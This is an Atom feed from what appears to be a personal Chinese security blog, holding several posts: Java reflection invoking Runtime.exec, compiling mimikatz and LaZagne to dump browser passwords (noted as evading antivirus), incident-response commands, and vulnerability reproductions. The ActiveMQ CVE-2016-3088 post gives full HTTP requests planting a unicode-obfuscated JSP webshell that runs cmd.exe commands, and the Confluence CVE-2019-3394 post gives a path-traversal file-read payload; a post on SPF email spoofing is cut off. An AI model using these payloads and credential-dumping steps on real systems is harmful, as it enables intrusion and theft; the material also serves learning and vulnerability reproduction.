<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sriracha :)</title>
  
  <subtitle>Wow, the smell is great!</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://sherlocz.github.io/"/>
  <updated>2020-05-28T03:09:09.970Z</updated>
  <id>http://sherlocz.github.io/</id>
  
  <author>
    <name>sher10ck</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>JAVA反射学习代码</title>
    <link href="http://sherlocz.github.io/2020/05/28/JAVA%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0%E4%BB%A3%E7%A0%81/"/>
    <id>http://sherlocz.github.io/2020/05/28/JAVA反射学习代码/</id>
    <published>2020-05-28T03:07:45.000Z</published>
    <updated>2020-05-28T03:09:09.970Z</updated>
    
    <content type="html"><![CDATA[<p>看这个：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">package test;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line">public class Demo &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        Object runtime = Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;, new Class[]&#123;&#125;).invoke(null);</span><br><span class="line">        //System.out.println(runtime.getClass().getName());</span><br><span class="line">        </span><br><span class="line">    Runtime.class.getMethod(&quot;exec&quot;,String.class).invoke(runtime,&quot;notepad.exe&quot;);</span><br><span class="line">    </span><br><span class="line">        System.out.println(runtime.getClass());</span><br><span class="line">        </span><br><span class="line">        System.out.println(Class.forName(&quot;java.lang.Runtime&quot;));</span><br><span class="line">        </span><br><span class="line">        System.out.println(Runtime.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>输出结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class java.lang.Runtime</span><br><span class="line">class java.lang.Runtime</span><br><span class="line">class java.lang.Runtime</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;看这个：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;
      
    
    </summary>
    
    
    
      <category term="JAVA" scheme="http://sherlocz.github.io/tags/JAVA/"/>
    
  </entry>
  
  <entry>
    <title>mimikatz编译</title>
    <link href="http://sherlocz.github.io/2020/05/20/mimikatz%E7%BC%96%E8%AF%91/"/>
    <id>http://sherlocz.github.io/2020/05/20/mimikatz编译/</id>
    <published>2020-05-20T10:50:45.000Z</published>
    <updated>2020-05-20T11:08:11.164Z</updated>
    
    <content type="html"><![CDATA[<p>我真的是菜死了，编译都不会妈鸭</p><p>主要是vs的问题<br><img src="/2020/05/20/mimikatz编译/download.png" alt><br>把旁边的 v14x工具 和 windows 10 SDK 都给安装上，不然编译的时候会报很多错误。</p><p>编译时候设置如下：<br><img src="/2020/05/20/mimikatz编译/1.png" alt><br><img src="/2020/05/20/mimikatz编译/2.png" alt></p><p>然后就可以编译了，问题不大。</p><p>拜</p><p>写文章越来越水啦</p><p>日，图片显示不出来 淦</p><p>好了好了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;我真的是菜死了，编译都不会妈鸭&lt;/p&gt;
&lt;p&gt;主要是vs的问题&lt;br&gt;&lt;img src=&quot;/2020/05/20/mimikatz编译/download.png&quot; alt&gt;&lt;br&gt;把旁边的 v14x工具 和 windows 10 SDK 都给安装上，不然编译的时候会报很多错
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>LaZagne编译抓取浏览器密码</title>
    <link href="http://sherlocz.github.io/2020/05/12/LaZagne%E7%BC%96%E8%AF%91%E6%8A%93%E5%8F%96%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%86%E7%A0%81/"/>
    <id>http://sherlocz.github.io/2020/05/12/LaZagne编译抓取浏览器密码/</id>
    <published>2020-05-12T11:33:08.000Z</published>
    <updated>2020-05-12T11:50:01.140Z</updated>
    
    <content type="html"><![CDATA[<p>其实编译的方法挺简单的，主要是想记录一下，LaZagne编译之后第一次使用是免杀的，原理不清楚，先记录一下</p><ul><li>下载地址：<a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a></li><li>编译文档：<a href="https://github.com/AlessandroZ/LaZagne/wiki/How-to-compile" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne/wiki/How-to-compile</a></li><li>编译好的exe下载：<a href="https://github.com/AlessandroZ/LaZagne/releases" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne/releases</a></li></ul><h1 id="编译方式"><a href="#编译方式" class="headerlink" title="编译方式"></a>编译方式</h1><p>首先将LaZagne源码下载下来，然后安装我们需要的python第三方库：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure></p><p><img src="/2020/05/12/LaZagne编译抓取浏览器密码/install.jpg" alt></p><p>安装pyinstaller：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pyinstaller</span><br></pre></td></tr></table></figure></p><p><img src="/2020/05/12/LaZagne编译抓取浏览器密码/pyinstaller.jpg" alt></p><p>利用pyinstaller编译：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller --onefile -w lazagne.spec</span><br></pre></td></tr></table></figure></p><p><img src="/2020/05/12/LaZagne编译抓取浏览器密码/success.jpg" alt></p><p>编译成功之后会在dist文件中生成LaZagne.exe</p><p>抓取浏览器密码<br><img src="/2020/05/12/LaZagne编译抓取浏览器密码/browsers.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;其实编译的方法挺简单的，主要是想记录一下，LaZagne编译之后第一次使用是免杀的，原理不清楚，先记录一下&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;下载地址：&lt;a href=&quot;https://github.com/AlessandroZ/LaZagne&quot; target=&quot;_blank&quot; 
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Apache ActiveMQ 远程代码执行漏洞复现</title>
    <link href="http://sherlocz.github.io/2020/04/18/Apache-ActiveMQ-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://sherlocz.github.io/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/</id>
    <published>2020-04-18T06:01:53.000Z</published>
    <updated>2020-04-18T06:38:56.388Z</updated>
    
    <content type="html"><![CDATA[<ul><li>漏洞编号：CVE-2016-3088</li><li>利用条件：需要登录在admin或者api中，默认密码为admin<br><img src="/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/1.png" alt></li></ul><p>首先获取当前路径：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx:8161/admin/test/systemProperties.jsp</span><br></pre></td></tr></table></figure></p><p><img src="/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/home.png" alt></p><p>然后使用PUT方式写入文件到fileserver这个路径下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PUT /fileserver/123123.txt HTTP/1.1</span><br><span class="line">Host: xxxxx:8161</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Authorization: Basic YWRtaW46YWRtaW4=</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=18wh2ode441ry1g7stwirxxm0v</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 3052</span><br><span class="line"></span><br><span class="line">&lt;%@ page import=&quot;java.util.*,java.io.*,java.net.*&quot;%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">\u0069\u0066\u0020\u0028\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002e\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0028\u0022\u0063\u006d\u0064\u0022\u0029\u0020\u0021\u003d\u0020\u006e\u0075\u006c\u006c\u0029\u0020\u007b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u006f\u0075\u0074\u002e\u0070\u0072\u0069\u006e\u0074\u006c\u006e\u0028\u0022\u0043\u006f\u006d\u006d\u0061\u006e\u0064\u003a\u0020\u0022\u0020\u002b\u0020\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002e\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0028\u0022\u0063\u006d\u0064\u0022\u0029\u0020\u002b\u0020\u0022\u005c\u006e\u003c\u0042\u0052\u003e\u0022\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0050\u0072\u006f\u0063\u0065\u0073\u0073\u0020\u0070\u0020\u003d\u0020\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u002e\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0028\u0029\u002e\u0065\u0078\u0065\u0063\u0028\u0022\u0063\u006d\u0064\u002e\u0065\u0078\u0065\u0020\u002f\u0063\u0020\u0022\u0020\u002b\u0020\u0072\u0065\u0071\u0075\u0065\u0073\u0074\u002e\u0067\u0065\u0074\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0028\u0022\u0063\u006d\u0064\u0022\u0029\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u004f\u0075\u0074\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0020\u006f\u0073\u0020\u003d\u0020\u0070\u002e\u0067\u0065\u0074\u004f\u0075\u0074\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0020\u0069\u006e\u0020\u003d\u0020\u0070\u002e\u0067\u0065\u0074\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0044\u0061\u0074\u0061\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0020\u0064\u0069\u0073\u0020\u003d\u0020\u006e\u0065\u0077\u0020\u0044\u0061\u0074\u0061\u0049\u006e\u0070\u0075\u0074\u0053\u0074\u0072\u0065\u0061\u006d\u0028\u0069\u006e\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0053\u0074\u0072\u0069\u006e\u0067\u0020\u0064\u0069\u0073\u0072\u0020\u003d\u0020\u0064\u0069\u0073\u002e\u0072\u0065\u0061\u0064\u004c\u0069\u006e\u0065\u0028\u0029\u003b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0077\u0068\u0069\u006c\u0065\u0020\u0028\u0020\u0064\u0069\u0073\u0072\u0020\u0021\u003d\u0020\u006e\u0075\u006c\u006c\u0020\u0029\u0020\u007b\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u006f\u0075\u0074\u002e\u0070\u0072\u0069\u006e\u0074\u006c\u006e\u0028\u0064\u0069\u0073\u0072\u0029\u003b\u0020\u0064\u0069\u0073\u0072\u0020\u003d\u0020\u0064\u0069\u0073\u002e\u0072\u0065\u0061\u0064\u004c\u0069\u006e\u0065\u0028\u0029\u003b\u0020\u007d\u000a\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u0020\u007d</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/content.png" alt></p><p>由于在fileserver这个路径下无法解析，我们接下来要使用MOVE方式移动到web能解析的目录下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">MOVE /fileserver/123123.txt HTTP/1.1</span><br><span class="line">Destination: file:///C:/apache-activemq-5.4.3/webapps/admin/sys1.jsp</span><br><span class="line">Host: xxx:8161</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=1pyt7l1je0zt0oka428srh0r6</span><br><span class="line">Content-Length: 4</span><br></pre></td></tr></table></figure></p><p><img src="/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/success.png" alt><br>注意有三个回车在最后鸭</p><p><img src="/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/admin.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;漏洞编号：CVE-2016-3088&lt;/li&gt;
&lt;li&gt;利用条件：需要登录在admin或者api中，默认密码为admin&lt;br&gt;&lt;img src=&quot;/2020/04/18/Apache-ActiveMQ-远程代码执行漏洞复现/1.png&quot; alt&gt;&lt;/li&gt;
&lt;
      
    
    </summary>
    
    
    
      <category term="漏洞复现" scheme="http://sherlocz.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>应急响应基础知识和命令</title>
    <link href="http://sherlocz.github.io/2020/03/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E5%91%BD%E4%BB%A4/"/>
    <id>http://sherlocz.github.io/2020/03/24/应急响应基础知识和命令/</id>
    <published>2020-03-24T09:42:22.000Z</published>
    <updated>2020-03-26T06:32:49.989Z</updated>
    
    <content type="html"><![CDATA[<p>最近在开始学习应急响应的相关知识，接触到了很多，比方说白加黑啊、几个APT组织啊，流量分析、天眼分析等等，其实还没有实际接触过应急响应，这里就先做个最基础的笔记，等会让我想想整体的框架是啥。</p><p>好了知道怎么写了，大概就这么写吧，这里不详细记录应急的过程，记录下一些基础的命令、工具和词汇。</p><p>应急一般会有：勒索病毒、挖矿木马、DDoS、APT攻击等。</p><p>不过主要的还是勒索和挖矿两种。</p><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><p>文件分析命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#查看tmp目录下的文件</span><br><span class="line">ls –alt /tmp/</span><br><span class="line"></span><br><span class="line">#查看开机启动项</span><br><span class="line">ls -alt /etc/init.d/</span><br><span class="line"></span><br><span class="line">#按时间排序查看指定目录下的文件</span><br><span class="line">ls -alt | head -n 10</span><br><span class="line"></span><br><span class="line">#查看文件创建修改时间信息</span><br><span class="line">stat</span><br><span class="line"></span><br><span class="line">#查看历史命令记录文件</span><br><span class="line">cat /root/.bash_history | more</span><br><span class="line"></span><br><span class="line">#查看操作系统用户信息文件/etc/passwd</span><br><span class="line">cat /etc/passwd</span><br><span class="line"></span><br><span class="line">#查找24小时内被修改的php文件</span><br><span class="line">find ./ -mtime 0 -name &quot;*.php&quot;</span><br><span class="line"></span><br><span class="line">#查找72小时内新增的文件</span><br><span class="line">find / -ctime 2</span><br><span class="line"></span><br><span class="line">#查找777的权限的jsp文件</span><br><span class="line">find / *.jpg -perm 4777</span><br><span class="line"></span><br><span class="line">#查看当前的任务计划有哪些</span><br><span class="line">crontab -l</span><br><span class="line"></span><br><span class="line">#查看etc目录任务计划相关文件</span><br><span class="line">ls /etc/cron*</span><br></pre></td></tr></table></figure></p><p>进程分析命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#查看本机网络连接情况</span><br><span class="line">netstat -antlp | more</span><br><span class="line"></span><br><span class="line">#根据netstat定位出pid，使用ps命令分析进程</span><br><span class="line">ps aux | grep pid | grep -v grep</span><br></pre></td></tr></table></figure></p><p>日志分析命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#查看系统中所有用户最近一次登陆信息</span><br><span class="line">lastlog</span><br><span class="line"></span><br><span class="line">#显示用户错误的登陆列表</span><br><span class="line">lastb</span><br><span class="line"></span><br><span class="line">#显示用户最近登陆信息（数据源为/var/log/wtmp、/var/log/btmp）</span><br><span class="line">last</span><br></pre></td></tr></table></figure></p><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><p>【开始】-&gt;【运行】<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msconfig//查看开机启动项</span><br><span class="line">%UserProfile%\Recent//Recent最近打开的文件夹</span><br><span class="line">compmgmt.msc//计算机管理</span><br><span class="line">eventvwr//事件管理器</span><br></pre></td></tr></table></figure></p><p>CMD命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#查看当前网络连接</span><br><span class="line">netstat -aon</span><br><span class="line">netstat -aon | findstr ESTABLISHED</span><br><span class="line"></span><br><span class="line">#根据netstat定位pid，根据pid定位进程</span><br><span class="line">tasklist | findstr 1228</span><br><span class="line"></span><br><span class="line">#根据wmic process获取进程的全部路径</span><br><span class="line">wmic process | findstr &quot;xxxx.exe&quot;</span><br><span class="line"></span><br><span class="line">#查看用户信息</span><br><span class="line">net user username</span><br><span class="line"></span><br><span class="line">#查看当前系统用户对话</span><br><span class="line">query user</span><br><span class="line"></span><br><span class="line">#踢出用户</span><br><span class="line">logoff</span><br><span class="line"></span><br><span class="line">#查看系统版本及补丁信息</span><br><span class="line">systeminfo</span><br></pre></td></tr></table></figure></p><p>系统信息排查：<br>1、查看环境变量<br>2、查看Windows计划<br>3、查看账号信息，如隐藏用户等；</p><p>排查工具：<br>1、PC Hunter<br>2、ProcessExplorer<br>3、Microsoft Network Monitor</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近在开始学习应急响应的相关知识，接触到了很多，比方说白加黑啊、几个APT组织啊，流量分析、天眼分析等等，其实还没有实际接触过应急响应，这里就先做个最基础的笔记，等会让我想想整体的框架是啥。&lt;/p&gt;
&lt;p&gt;好了知道怎么写了，大概就这么写吧，这里不详细记录应急的过程，记录下一
      
    
    </summary>
    
    
    
      <category term="应急响应" scheme="http://sherlocz.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>Confluence文件读取漏洞复现(CVE-2019-3394)</title>
    <link href="http://sherlocz.github.io/2020/03/24/Confluence%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2019-3394/"/>
    <id>http://sherlocz.github.io/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/</id>
    <published>2020-03-24T02:30:01.000Z</published>
    <updated>2020-03-24T04:08:00.344Z</updated>
    
    <content type="html"><![CDATA[<h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p>6.1.0 &lt;= version &lt; 6.6.16<br>6.7.0 &lt;= version &lt; 6.13.7<br>6.14.0 &lt;= version &lt; 6.15.8</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>使用P师傅的vulhub直接上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker-compose</span><br><span class="line"># Download the latest version of the vulhub </span><br><span class="line">git clone https://github.com/vulhub/vulhub.git  </span><br><span class="line"># Entry vulnerability directory </span><br><span class="line">cd /confluence/CVE-2019-3396/</span><br><span class="line"># Compile (optional) </span><br><span class="line">docker-compose build </span><br><span class="line"># Run </span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p><p>安装完成之后本地会开启8090端口，我们根据导向进行安装<br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/1.png" alt><br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/2.png" alt><br>这里我们需要去官网获取一个licence，注意这里的Server ID，成功获取之后在Setup页面点击下一步，等他转圈圈就行了<br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/3.png" alt><br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/4.png" alt><br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/5.png" alt><br>然后稀里糊涂就安装成功了。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>创建页面的时候抓包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PUT /rest/api/content/65603?status=draft HTTP/1.1</span><br><span class="line">Host: 192.168.75.138:8090</span><br><span class="line">Content-Length: 373</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36</span><br><span class="line">Content-Type: application/json; charset=UTF-8</span><br><span class="line">Origin: http://192.168.75.138:8090</span><br><span class="line">Referer: http://192.168.75.138:8090/pages/resumedraft.action?draftId=65603&amp;draftShareId=e3bf8f62-5cdc-4586-ae67-0098ed31f5a5</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=EB2B904418498E2A22446B8A4D44664A</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;status&quot;:&quot;current&quot;,&quot;title&quot;:&quot;123123&quot;,&quot;space&quot;:&#123;&quot;key&quot;:&quot;SHER&quot;&#125;,&quot;body&quot;:&#123;&quot;editor&quot;:&#123;&quot;value&quot;:&lt;p&gt;1231231&lt;/p&gt;</span><br><span class="line">&quot;,&quot;representation&quot;:&quot;editor&quot;,&quot;content&quot;:&#123;&quot;id&quot;:&quot;65603&quot;&#125;&#125;&#125;,&quot;id&quot;:&quot;65603&quot;,&quot;type&quot;:&quot;page&quot;,&quot;version&quot;:&#123;&quot;number&quot;:1,&quot;minorEdit&quot;:true,&quot;syncRev&quot;:&quot;0.2ROrHE4DizkcCc1u6UtkBrc.10&quot;&#125;,&quot;ancestors&quot;:[&#123;&quot;id&quot;:&quot;65584&quot;,&quot;type&quot;:&quot;page&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure></p><p>将其中的value值修改成：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&lt;img class=\&quot;confluence-embedded-image\&quot; src=\&quot;/packages/../web.xml\&quot; /&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure></p><p>然后再导出word的时候抓包</p><p><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/6.png" alt><br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/7.png" alt></p><p>RCE<br><img src="/2020/03/24/Confluence文件读取漏洞复现-CVE-2019-3394/8.png" alt></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://github.com/jas502n/CVE-2019-3394" title="https://github.com/jas502n/CVE-2019-3394" target="_blank" rel="noopener">CVE-2019-3394</a><br><a href="https://github.com/Yt1g3r/CVE-2019-3396_EXP" title="https://github.com/Yt1g3r/CVE-2019-3396_EXP" target="_blank" rel="noopener">https://github.com/Yt1g3r/CVE-2019-3396_EXP</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;影响范围&quot;&gt;&lt;a href=&quot;#影响范围&quot; class=&quot;headerlink&quot; title=&quot;影响范围&quot;&gt;&lt;/a&gt;影响范围&lt;/h1&gt;&lt;p&gt;6.1.0 &amp;lt;= version &amp;lt; 6.6.16&lt;br&gt;6.7.0 &amp;lt;= version &amp;lt; 6.
      
    
    </summary>
    
    
    
      <category term="漏洞复现" scheme="http://sherlocz.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>利用spf伪造邮箱发送</title>
    <link href="http://sherlocz.github.io/2020/03/23/%E5%88%A9%E7%94%A8spf%E4%BC%AA%E9%80%A0%E9%82%AE%E7%AE%B1%E5%8F%91%E9%80%81/"/>
    <id>http://sherlocz.github.io/2020/03/23/利用spf伪造邮箱发送/</id>
    <published>2020-03-23T04:40:56.000Z</published>
    <updated>2020-03-23T04:49:58.665Z</updated>
    
